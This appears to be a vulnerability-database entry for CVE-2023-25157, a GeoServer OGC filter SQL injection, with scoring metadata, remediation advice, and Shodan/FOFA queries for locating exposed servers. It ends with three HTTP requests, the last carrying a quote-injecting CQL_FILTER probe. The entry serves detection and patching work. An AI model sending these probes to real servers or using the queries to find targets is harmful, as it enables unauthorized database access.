---
layout: post
cve_id: CVE-2023-25157
title: GeoServer OGC Filter - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-25157.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-25157.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha,DhiyaneshDK,iamnoooob,rootxharsh
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access, data
  leakage, or data manipulation.

  '
remediation: 'Apply the latest security patches or updates provided by the GeoServer
  project to fix the SQL Injection vulnerability.

  '
reference:
- https://twitter.com/parzel2/status/1665726454489915395
- https://nvd.nist.gov/vuln/detail/CVE-2023-25157
- https://github.com/win3zz/CVE-2023-25157
- https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
- https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-25157
  cwe-id: CWE-89
  epss-score: 0.93866
  epss-percentile: 0.9986
  cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
metadata:
  verified: 'true'
  max-request: 3
  vendor: osgeo
  product: geoserver
  shodan-query:
  - title:"geoserver"
  - http.title:"geoserver"
  fofa-query:
  - title="geoserver"
  - app="geoserver"
  google-query: intitle:"geoserver"
tags:
- cve2023
- cve
- geoserver
- ogc
- sqli
- intrusive
- osgeo
- vkev
- vuln
---

## üîç Vulnerability Description
GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. GeoServer includes support for the OGC Filter expression language and the OGC Common Query Language (CQL) as part of the Web Feature Service (WFS) and Web Map Service (WMS) protocols. CQL is also supported through the Web Coverage Service (WCS) protocol for ImageMosaic coverages. Users are advised to upgrade to either version 2.21.4, or version 2.22.2 to resolve this issue. Users unable to upgrade should disable the PostGIS Datastore *encode functions* setting to mitigate ``strEndsWith``, ``strStartsWith`` and ``PropertyIsLike `` misuse and enable the PostGIS DataStore *preparedStatements* setting to mitigate the ``FeatureId`` misuse.


## üåê HTTP Request
```nohighlight
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=KMYoRq&maxFeatures=50&outputFormat=csv HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=KMYoRq&CQL_FILTER=strStartswith(S2XUGH,%27%27%27%27)=true HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/15.0
Connection: close
Accept-Encoding: gzip
```

